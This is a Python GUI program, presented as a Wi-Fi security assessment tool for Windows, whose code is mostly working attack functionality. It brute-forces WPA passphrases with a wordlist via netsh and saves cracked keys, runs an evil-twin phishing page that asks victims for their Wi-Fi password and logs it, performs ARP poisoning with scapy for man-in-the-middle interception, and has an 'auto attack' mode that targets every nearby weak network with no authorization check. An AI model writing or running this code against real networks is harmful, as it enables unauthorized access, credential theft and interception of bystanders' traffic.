#!/usr/bin/env python3
"""
Wi-Fi Pentest Tool - GUI Version
Compatible with Windows PowerShell (no Arabic in code)
"""

import os
import sys
import time
import re
import subprocess
import threading
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
from datetime import datetime

# ========== MAIN APPLICATION ==========

class WiFiPentestGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Wi-Fi Security Assessment Tool v2.0")
        self.root.geometry("900x700")
        self.root.configure(bg='#1a1a2e')
        
        # Variables
        self.interfaces = []
        self.networks = []
        self.is_scanning = False
        self.is_attacking = False
        
        # Setup UI
        self.setup_ui()
        
        # Check admin
        self.check_admin()
    
    def check_admin(self):
        """Check for admin privileges"""
        try:
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if not is_admin:
                self.log("[-] MUST RUN AS ADMINISTRATOR!")
                self.log("[*] Right click -> Run as Administrator")
            else:
                self.log("[+] Running as Administrator - OK")
        except:
            self.log("[*] Running on non-Windows system")
    
    def setup_ui(self):
        """Setup the user interface"""
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('TButton', background='#0f3460', foreground='white', 
                       font=('Consolas', 10), padding=8)
        style.configure('TLabel', background='#1a1a2e', foreground='white',
                       font=('Consolas', 10))
        style.configure('TFrame', background='#1a1a2e')
        
        # Main container
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Title
        title_label = ttk.Label(main_frame, 
                               text="=== Wi-Fi Security Assessment Tool ===",
                               font=('Consolas', 14, 'bold'),
                               foreground='#e94560')
        title_label.pack(pady=10)
        
        # Control buttons frame
        btn_frame = ttk.Frame(main_frame)
        btn_frame.pack(fill=tk.X, pady=5)
        
        # Row 1
        row1 = ttk.Frame(btn_frame)
        row1.pack(fill=tk.X, pady=2)
        
        self.btn_scan = ttk.Button(row1, text="[1] SCAN NETWORKS", 
                                   command=self.scan_networks)
        self.btn_scan.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        self.btn_open = ttk.Button(row1, text="[2] OPEN NETWORK ATTACK",
                                   command=self.attack_open)
        self.btn_open.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        self.btn_dict = ttk.Button(row1, text="[3] DICTIONARY ATTACK",
                                   command=self.dictionary_attack)
        self.btn_dict.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        # Row 2
        row2 = ttk.Frame(btn_frame)
        row2.pack(fill=tk.X, pady=2)
        
        self.btn_evil = ttk.Button(row2, text="[4] EVIL TWIN",
                                   command=self.evil_twin)
        self.btn_evil.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        self.btn_arp = ttk.Button(row2, text="[5] ARP SPOOFING",
                                  command=self.arp_spoof)
        self.btn_arp.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        self.btn_auto = ttk.Button(row2, text="[6] AUTO ATTACK",
                                   command=self.auto_attack)
        self.btn_auto.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        # Row 3 - Utility buttons
        row3 = ttk.Frame(btn_frame)
        row3.pack(fill=tk.X, pady=2)
        
        self.btn_clear = ttk.Button(row3, text="[C] CLEAR LOG",
                                    command=self.clear_log)
        self.btn_clear.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        self.btn_save = ttk.Button(row3, text="[S] SAVE LOG",
                                   command=self.save_log)
        self.btn_save.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        self.btn_exit = ttk.Button(row3, text="[X] EXIT",
                                   command=self.root.quit)
        self.btn_exit.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        # Network list
        list_frame = ttk.Frame(main_frame)
        list_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        list_label = ttk.Label(list_frame, text="=== DETECTED NETWORKS ===",
                              font=('Consolas', 11, 'bold'), foreground='#00ff00')
        list_label.pack(anchor=tk.W)
        
        # Treeview for networks
        columns = ('#1', '#2', '#3', '#4', '#5')
        self.tree = ttk.Treeview(list_frame, columns=columns, show='headings',
                                 height=8)
        
        self.tree.heading('#1', text='SSID')
        self.tree.heading('#2', text='BSSID')
        self.tree.heading('#3', text='CH')
        self.tree.heading('#4', text='ENCRYPTION')
        self.tree.heading('#5', text='SIGNAL')
        
        self.tree.column('#1', width=200)
        self.tree.column('#2', width=180)
        self.tree.column('#3', width=50)
        self.tree.column('#4', width=150)
        self.tree.column('#5', width=80)
        
        vsb = ttk.Scrollbar(list_frame, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=vsb.set)
        
        self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        vsb.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.tree.bind('<Double-Button-1>', self.on_network_select)
        
        # Log area
        log_frame = ttk.Frame(main_frame)
        log_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        log_label = ttk.Label(log_frame, text="=== OUTPUT LOG ===",
                             font=('Consolas', 11, 'bold'), foreground='#ffff00')
        log_label.pack(anchor=tk.W)
        
        self.log_area = scrolledtext.ScrolledText(log_frame,
                                                  bg='#0a0a1a',
                                                  fg='#00ff00',
                                                  insertbackground='white',
                                                  font=('Consolas', 9),
                                                  height=15)
        self.log_area.pack(fill=tk.BOTH, expand=True)
        
        # Status bar
        self.status_var = tk.StringVar()
        self.status_var.set("Ready - Select an option above")
        status_bar = ttk.Label(main_frame, textvariable=self.status_var,
                              relief=tk.SUNKEN, anchor=tk.W,
                              font=('Consolas', 9))
        status_bar.pack(fill=tk.X, pady=2)
        
        # Initial scan
        self.log("[*] Tool loaded successfully")
        self.log("[*] Select option or double-click a network")
    
    def log(self, message):
        """Add message to log area"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_area.insert(tk.END, f"[{timestamp}] {message}\n")
        self.log_area.see(tk.END)
        self.root.update_idletasks()
    
    def clear_log(self):
        """Clear the log area"""
        self.log_area.delete(1.0, tk.END)
    
    def save_log(self):
        """Save log to file"""
        filename = f"pentest_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(self.log_area.get(1.0, tk.END))
        self.log(f"[+] Log saved to: {filename}")
    
    def set_status(self, text):
        """Update status bar"""
        self.status_var.set(text)
        self.root.update_idletasks()
    
    def thread_wrapper(self, target_func):
        """Run function in thread to keep GUI responsive"""
        if self.is_attacking:
            self.log("[-] Operation already in progress!")
            return
        
        self.is_attacking = True
        thread = threading.Thread(target=self._run_with_cleanup(target_func))
        thread.daemon = True
        thread.start()
    
    def _run_with_cleanup(self, func):
        """Wrapper to reset flag after function completes"""
        def wrapper():
            try:
                func()
            except Exception as e:
                self.log(f"[-] Error: {str(e)}")
            finally:
                self.is_attacking = False
                self.set_status("Ready")
        return wrapper
    
    def scan_networks(self):
        """Scan for Wi-Fi networks"""
        self.thread_wrapper(self._scan_networks)
    
    def _scan_networks(self):
        """Internal scan function"""
        self.is_scanning = True
        self.set_status("[*] Scanning for networks...")
        self.log("[*] Starting network scan...")
        
        # Clear tree
        for item in self.tree.get_children():
            self.tree.delete(item)
        
        self.networks = []
        
        try:
            # Method 1: netsh
            result = subprocess.run('netsh wlan show networks mode=bssid',
                                  shell=True, capture_output=True, text=True,
                                  encoding='utf-8', errors='ignore')
            
            current_net = {}
            for line in result.stdout.split('\n'):
                line = line.strip()
                
                if 'SSID' in line and 'BSSID' not in line and ':' in line:
                    # Save previous network
                    if current_net.get('ssid'):
                        self.networks.append(current_net)
                    
                    parts = line.split(':')
                    if len(parts) > 1:
                        ssid = parts[1].strip()
                        current_net = {'ssid': ssid if ssid else '(Hidden)'}
                
                elif 'BSSID' in line and ':' in line:
                    # Extract BSSID properly
                    bssid_match = re.search(r'([0-9a-fA-F:]{17})', line)
                    if bssid_match:
                        current_net['bssid'] = bssid_match.group(1)
                
                elif 'Signal' in line and ':' in line:
                    parts = line.split(':')
                    if len(parts) > 1:
                        current_net['signal'] = parts[1].strip()
                
                elif 'Channel' in line and ':' in line:
                    parts = line.split(':')
                    if len(parts) > 1:
                        current_net['channel'] = parts[1].strip()
                
                elif 'Authentication' in line and ':' in line:
                    parts = line.split(':')
                    if len(parts) > 1:
                        current_net['encryption'] = parts[1].strip()
            
            # Add last network
            if current_net.get('ssid'):
                self.networks.append(current_net)
            
            # Add to treeview
            for net in self.networks:
                ssid = net.get('ssid', 'Unknown')
                bssid = net.get('bssid', 'N/A')
                channel = net.get('channel', '?')
                encryption = net.get('encryption', 'Unknown')
                signal = net.get('signal', '0%')
                
                # Color coding based on security
                tag = 'weak' if 'Open' in encryption or 'WEP' in encryption else \
                      'medium' if 'WPA' in encryption and 'WPA3' not in encryption else \
                      'strong'
                
                self.tree.insert('', tk.END, values=(ssid, bssid, channel, encryption, signal),
                                tags=(tag,))
            
            self.tree.tag_configure('weak', foreground='#ff4444')
            self.tree.tag_configure('medium', foreground='#ffaa00')
            self.tree.tag_configure('strong', foreground='#00ff00')
            
            self.log(f"[+] Scan complete: Found {len(self.networks)} networks")
            
            # Summary
            open_nets = len([n for n in self.networks if 'Open' in n.get('encryption', '')])
            wpa_nets = len([n for n in self.networks if 'WPA' in n.get('encryption', '')])
            
            self.log(f"    - Open (no password): {open_nets}")
            self.log(f"    - WPA/WPA2: {wpa_nets}")
            
        except Exception as e:
            self.log(f"[-] Scan error: {str(e)}")
        
        self.is_scanning = False
        self.set_status(f"[+] Found {len(self.networks)} networks")
    
    def on_network_select(self, event):
        """Handle double-click on network"""
        selected = self.tree.selection()
        if selected:
            item = self.tree.item(selected[0])
            values = item['values']
            self.log(f"\n[*] Selected: {values[0]} ({values[1]})")
            self.log(f"    Channel: {values[2]}, Encryption: {values[3]}, Signal: {values[4]}")
            
            # Show attack menu
            self.show_attack_menu(values)
    
    def show_attack_menu(self, network_info):
        """Show attack options for selected network"""
        ssid = network_info[0]
        bssid = network_info[1]
        encryption = network_info[3]
        
        win = tk.Toplevel(self.root)
        win.title(f"Attack Options - {ssid}")
        win.geometry("400x300")
        win.configure(bg='#1a1a2e')
        
        ttk.Label(win, text=f"Network: {ssid}", font=('Consolas', 12, 'bold'),
                 foreground='#e94560').pack(pady=10)
        ttk.Label(win, text=f"Encryption: {encryption}",
                 font=('Consolas', 10)).pack()
        ttk.Label(win, text=f"BSSID: {bssid}",
                 font=('Consolas', 10)).pack()
        
        ttk.Separator(win, orient='horizontal').pack(fill=tk.X, pady=10)
        
        ttk.Label(win, text="Select Attack:", font=('Consolas', 11)).pack()
        
        if 'Open' in encryption:
            ttk.Button(win, text="1. Connect (Open Network)",
                      command=lambda: self._connect_open(ssid, win)).pack(pady=5)
        
        if 'WPA' in encryption:
            ttk.Button(win, text="2. Dictionary Attack (WPA)",
                      command=lambda: self._dict_attack_gui(ssid, win)).pack(pady=5)
        
        if 'WPA' in encryption or 'WPA2' in encryption:
            ttk.Button(win, text="3. WPS Attack",
                      command=lambda: self._wps_attack(bssid, win)).pack(pady=5)
        
        ttk.Button(win, text="4. Evil Twin (Fake AP)",
                  command=lambda: self._evil_twin_gui(ssid, bssid, win)).pack(pady=5)
    
    def attack_open(self):
        """Attack open networks"""
        self.thread_wrapper(self._attack_open)
    
    def _attack_open(self):
        """Internal open network attack"""
        open_nets = [n for n in self.networks if 'Open' in n.get('encryption', '')]
        
        if not open_nets:
            self.log("[-] No open networks found")
            return
        
        self.log(f"\n[*] Found {len(open_nets)} open networks")
        
        for net in open_nets[:3]:  # Attack first 3
            ssid = net['ssid']
            self.log(f"\n[*] Attempting to connect to: {ssid}")
            
            # Create XML profile
            profile = f'''<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>open</authentication>
                <encryption>none</encryption>
            </authEncryption>
        </security>
    </MSM>
</WLANProfile>'''
            
            profile_path = os.path.join(os.environ['TEMP'], f'open_{ssid}.xml')
            with open(profile_path, 'w', encoding='utf-8') as f:
                f.write(profile)
            
            # Try to connect
            add_result = subprocess.run(
                f'netsh wlan add profile filename="{profile_path}"',
                shell=True, capture_output=True, text=True)
            
            conn_result = subprocess.run(
                f'netsh wlan connect name="{ssid}"',
                shell=True, capture_output=True, text=True)
            
            time.sleep(3)
            
            # Check connection
            check = subprocess.run('netsh wlan show interfaces',
                                 shell=True, capture_output=True, text=True)
            
            if 'connected' in check.stdout.lower():
                self.log(f"[+] SUCCESS: Connected to {ssid}")
                
                # Get IP
                ipconfig = subprocess.run('ipconfig', shell=True,
                                        capture_output=True, text=True)
                ip_match = re.search(r'IPv4.*?: (\d+\.\d+\.\d+\.\d+)', ipconfig.stdout)
                
                if ip_match:
                    self.log(f"[+] Got IP: {ip_match.group(1)}")
                    
                    # Quick scan
                    subnet = '.'.join(ip_match.group(1).split('.')[:3]) + '.0/24'
                    self.log(f"[*] Scanning subnet: {subnet}")
                    
                    scan = subprocess.run(f'nmap -sn {subnet} --open',
                                        shell=True, capture_output=True, text=True,
                                        timeout=30)
                    self.log(scan.stdout[:500])
            else:
                self.log(f"[-] Failed to connect to {ssid}")
    
    def dictionary_attack(self):
        """Start dictionary attack"""
        self.thread_wrapper(self._dict_attack)
    
    def _dict_attack(self):
        """Internal dictionary attack"""
        if not self.networks:
            self.log("[-] No networks found. Scan first!")
            return
        
        # Let user select network
        self.log("\n[*] Available networks for dictionary attack:")
        wpa_nets = [n for n in self.networks if 'WPA' in n.get('encryption', '')]
        
        for i, net in enumerate(wpa_nets[:10]):
            self.log(f"    [{i}] {net['ssid']} ({net.get('encryption', 'N/A')})")
        
        self.log("[*] Double-click a network in the list to attack it")
    
    def _connect_open(self, ssid, window):
        """Connect to open network from GUI"""
        window.destroy()
        self.thread_wrapper(lambda: self._connect_open_internal(ssid))
    
    def _connect_open_internal(self, ssid):
        """Internal connect to open network"""
        self.log(f"\n[*] Connecting to open network: {ssid}")
        
        profile = f'''<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>open</authentication>
                <encryption>none</encryption>
            </authEncryption>
        </security>
    </MSM>
</WLANProfile>'''
        
        profile_path = os.path.join(os.environ['TEMP'], f'open_{ssid}.xml')
        with open(profile_path, 'w', encoding='utf-8') as f:
            f.write(profile)
        
        subprocess.run(f'netsh wlan add profile filename="{profile_path}"',
                      shell=True)
        result = subprocess.run(f'netsh wlan connect name="{ssid}"',
                              shell=True, capture_output=True, text=True)
        
        time.sleep(3)
        
        check = subprocess.run('netsh wlan show interfaces',
                             shell=True, capture_output=True, text=True)
        
        if 'connected' in check.stdout.lower():
            self.log(f"[+] Connected to {ssid}")
            ipconfig = subprocess.run('ipconfig', shell=True,
                                    capture_output=True, text=True)
            ip_match = re.search(r'IPv4.*?: (\d+\.\d+\.\d+\.\d+)', ipconfig.stdout)
            if ip_match:
                self.log(f"[+] IP: {ip_match.group(1)}")
        else:
            self.log(f"[-] Connection failed: {result.stderr}")
    
    def _dict_attack_gui(self, ssid, window):
        """Dictionary attack from GUI"""
        window.destroy()
        
        # Ask for wordlist
        wordlist = filedialog.askopenfilename(
            title="Select wordlist file",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if wordlist:
            self.thread_wrapper(lambda: self._dict_attack_internal(ssid, wordlist))
    
    def _dict_attack_internal(self, ssid, wordlist_path):
        """Internal dictionary attack with wordlist"""
        self.log(f"\n[*] Starting dictionary attack on: {ssid}")
        self.log(f"[*] Using wordlist: {wordlist_path}")
        
        if not os.path.exists(wordlist_path):
            self.log("[-] Wordlist file not found!")
            return
        
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        
        self.log(f"[*] Loaded {len(passwords)} passwords")
        
        found = False
        for i, password in enumerate(passwords):
            if i % 50 == 0:
                self.set_status(f"[*] Testing password {i}/{len(passwords)}")
                self.root.update()
            
            # Try each password
            profile = f'''<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>'''
            
            profile_path = os.path.join(os.environ['TEMP'], f'dict_{ssid}.xml')
            with open(profile_path, 'w', encoding='utf-8') as f:
                f.write(profile)
            
            subprocess.run(f'netsh wlan add profile filename="{profile_path}"',
                          shell=True, capture_output=True)
            result = subprocess.run(f'netsh wlan connect name="{ssid}"',
                                  shell=True, capture_output=True, text=True)
            
            time.sleep(2)
            
            check = subprocess.run('netsh wlan show interfaces',
                                 shell=True, capture_output=True, text=True)
            
            # Clean up profile
            subprocess.run(f'netsh wlan delete profile name="{ssid}"',
                          shell=True, capture_output=True)
            os.remove(profile_path)
            
            if 'connected' in check.stdout.lower():
                self.log(f"\n[+] SUCCESS! Password found: {password}")
                self.log(f"[+] Network: {ssid}")
                found = True
                
                # Save to file
                with open('cracked_passwords.txt', 'a') as f:
                    f.write(f"{ssid}:{password}\n")
                self.log("[+] Password saved to: cracked_passwords.txt")
                break
        
        if not found:
            self.log("[-] Password not found in wordlist")
    
    def _wps_attack(self, bssid, window):
        """WPS attack attempt"""
        window.destroy()
        self.log(f"\n[*] WPS Attack on {bssid}")
        self.log("[!] WPS attack requires external tools on Windows")
        self.log("[*] Recommended: Use Kali Linux VM for WPS attacks")
        self.log("    Tools: reaver, bully")
    
    def evil_twin(self):
        """Start evil twin attack"""
        self.thread_wrapper(self._evil_twin)
    
    def _evil_twin(self):
        """Internal evil twin"""
        self.log("\n[*] Evil Twin Attack")
        self.log("[!] On Windows, use these tools instead:")
        self.log("    1. MaryFi (https://maryfi.com)")
        self.log("    2. Connectify Hotspot")
        self.log("    3. Or use Kali Linux VM")
        
        # Simple HTTP server for portal
        self.log("\n[*] Starting credential harvesting server...")
        self._start_http_capture()
    
    def _evil_twin_gui(self, ssid, bssid, window):
        """Evil twin from GUI"""
        window.destroy()
        self.log(f"\n[*] Evil Twin for: {ssid}")
        self._start_http_capture()
    
    def _start_http_capture(self):
        """Start HTTP server to capture credentials"""
        import http.server
        import urllib.parse
        
        class CaptureHandler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                
                html = """<!DOCTYPE html>
<html>
<head><title>Network Update</title></head>
<body style="text-align:center;font-family:Arial;margin-top:50px;">
<h2>Wi-Fi Security Update Required</h2>
<p>Please enter your network password to continue:</p>
<form method="POST" action="/">
<input type="password" name="pass" placeholder="Enter Wi-Fi password" size="30" required>
<br><br>
<input type="submit" value="Update">
</form>
</body>
</html>"""
                self.wfile.write(html.encode())
            
            def do_POST(self):
                length = int(self.headers['Content-Length'])
                body = self.rfile.read(length).decode()
                params = urllib.parse.parse_qs(body)
                
                if 'pass' in params:
                    pwd = params['pass'][0]
                    with open('harvested_credentials.txt', 'a') as f:
                        f.write(f"[{datetime.now()}] Password: {pwd}\n")
                
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b'<html><body><h2>Update complete. You may close this page.</h2></body></html>')
        
        server = http.server.HTTPServer(('0.0.0.0', 8080), CaptureHandler)
        self.log("[+] HTTP server running on port 8080")
        self.log("[+] Victims connect to: http://[YOUR_IP]:8080")
        self.log("[+] Credentials saved to: harvested_credentials.txt")
        
        # Run in thread
        thread = threading.Thread(target=server.serve_forever)
        thread.daemon = True
        thread.start()
    
    def arp_spoof(self):
        """Start ARP spoofing"""
        self.thread_wrapper(self._arp_spoof)
    
    def _arp_spoof(self):
        """Internal ARP spoofing"""
        self.log("\n[*] ARP Spoofing / MITM Attack")
        self.log("[*] This requires scapy library")
        
        try:
            from scapy.all import ARP, Ether, send, sniff, wrpcap
            
            target_ip = input("Enter target IP: ")
            gateway_ip = input("Enter gateway IP: ")
            
            self.log(f"[*] Target: {target_ip}")
            self.log(f"[*] Gateway: {gateway_ip}")
            
            def poison(ip1, ip2):
                packet = ARP(op=2, pdst=ip1, hwdst='ff:ff:ff:ff:ff:ff', psrc=ip2)
                send(packet, verbose=False)
            
            self.log("[*] Starting ARP poisoning...")
            self.log("[*] Press Ctrl+C in terminal to stop")
            
            # Run for 30 seconds
            for _ in range(30):
                poison(target_ip, gateway_ip)
                poison(gateway_ip, target_ip)
                time.sleep(0.5)
            
            self.log("[*] ARP spoofing complete")
            
        except ImportError:
            self.log("[-] scapy not installed")
            self.log("[*] Install: pip install scapy")
    
    def auto_attack(self):
        """Automated attack on all weak networks"""
        self.thread_wrapper(self._auto_attack)
    
    def _auto_attack(self):
        """Internal auto attack"""
        self.log("\n[*] AUTO ATTACK MODE")
        self.log("[*] Scanning and attacking weak networks...\n")
        
        # Scan first
        self._scan_networks()
        
        if not self.networks:
            self.log("[-] No networks found")
            return
        
        # Get open networks
        open_nets = [n for n in self.networks if 'Open' in n.get('encryption', '')]
        wpa_nets = [n for n in self.networks if 'WPA' in n.get('encryption', '')]
        
        # Attack open networks first
        if open_nets:
            self.log(f"\n[!] Found {len(open_nets)} open networks!")
            for net in open_nets[:2]:
                self._connect_open_internal(net['ssid'])
                time.sleep(2)
        
        # Try dictionary on WPA
        if wpa_nets:
            self.log(f"\n[!] Found {len(wpa_nets)} WPA networks")
            
            # Check for common wordlist
            wordlists = [
                'wordlist.txt',
                'passwords.txt',
                os.path.expanduser('~/Desktop/wordlist.txt'),
                'C:\\Users\\Public\\wordlist.txt'
            ]
            
            wordlist = None
            for wl in wordlists:
                if os.path.exists(wl):
                    wordlist = wl
                    break
            
            if wordlist:
                self.log(f"[*] Using wordlist: {wordlist}")
                for net in wpa_nets[:2]:
                    self._dict_attack_internal(net['ssid'], wordlist)
            else:
                self.log("[-] No wordlist found. Create a wordlist.txt file")
        
        self.log("\n[*] Auto attack complete!")


# ========== MAIN ==========
if __name__ == '__main__':
    root = tk.Tk()
    app = WiFiPentestGUI(root)
    root.mainloop()